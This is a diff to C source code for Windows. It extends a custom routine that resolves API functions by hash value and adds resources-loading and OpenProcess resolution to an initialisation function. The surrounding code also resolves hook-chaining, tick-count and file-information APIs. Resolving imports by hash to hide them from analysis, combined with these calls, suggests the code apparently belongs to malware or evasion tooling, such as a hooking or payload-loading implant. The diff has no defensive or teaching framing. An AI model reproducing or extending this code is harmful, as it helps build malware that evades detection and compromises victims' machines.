@@ -44,6 +44,10 @@ FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName)
 
 FARPROC GetProcAddressByHashValue(IN HMODULE hModule, IN DWORD dwApiNameHashValue)
 {
+	// Checking if the module is valid
+	if (!hModule)
+		return NULL;
+
 	// We do this to avoid casting each time we use 'hModule'
 	PBYTE pBase = (PBYTE)hModule;
 
@@ -164,6 +168,7 @@ BOOL InitializeWinApis()
 {
 	//	User32.dll exported
 	HMODULE hUser32Dll = GetModuleHandleByHashValue(USER32DLLHashValue);
+
 	g_Api.pCallNextHookEx = (fnCallNextHookEx)GetProcAddressByHashValue(
 		hUser32Dll,
 		CallNextHookExHashValue
@@ -194,6 +199,27 @@ BOOL InitializeWinApis()
 
 	// 	Kernel32.dll exported
 	HMODULE hKernel32Dll = GetModuleHandleByHashValue(KERNEL32DLLHashValue);
+
+	g_Api.pFindResourceW = (fnFindResourceW)GetProcAddressByHashValue(
+		hKernel32Dll,
+		FindResourceWHashValue
+	);
+	g_Api.pLoadResource = (fnLoadResource)GetProcAddressByHashValue(
+		hKernel32Dll,
+		LoadResourceHashValue
+	);
+	g_Api.pLockResource = (fnLockResource)GetProcAddressByHashValue(
+		hKernel32Dll,
+		LockResourceHashValue
+	);
+	g_Api.pSizeofResource = (fnSizeofResource)GetProcAddressByHashValue(
+		hKernel32Dll,
+		SizeofResourceHashValue
+	);
+	g_Api.pOpenProcess = (fnOpenProcess)GetProcAddressByHashValue(
+		hKernel32Dll,
+		OpenProcessHashValue
+	);
 	g_Api.pGetModuleFileNameW = (fnGetModuleFileNameW)GetProcAddressByHashValue(
 		hKernel32Dll,
 		GetModuleFileNameWHashValue
@@ -206,19 +232,20 @@ BOOL InitializeWinApis()
 		hKernel32Dll,
 		GetTickCount64HashValue
 	);
-	g_Api.pOpenProcess = (fnOpenProcess)GetProcAddressByHashValue(
-		hKernel32Dll,
-		OpenProcessHashValue
-	);
+
 	g_Api.pSetFileInformationByHandle = (fnSetFileInformationByHandle)GetProcAddressByHashValue(
 		hKernel32Dll,
 		SetFileInformationByHandleHashValue
 	);
 
-	if (g_Api.pGetModuleFileNameW == NULL ||
+	if (g_Api.pFindResourceW == NULL ||
+		g_Api.pLoadResource == NULL ||
+		g_Api.pLockResource == NULL ||
+		g_Api.pOpenProcess == NULL ||
+		g_Api.pSizeofResource == NULL ||
+		g_Api.pGetModuleFileNameW == NULL ||
 		g_Api.pCreateFileW == NULL ||
 		g_Api.pGetTickCount64 == NULL ||
-		g_Api.pOpenProcess == NULL ||
 		g_Api.pSetFileInformationByHandle == NULL)
 		return FALSE;
 
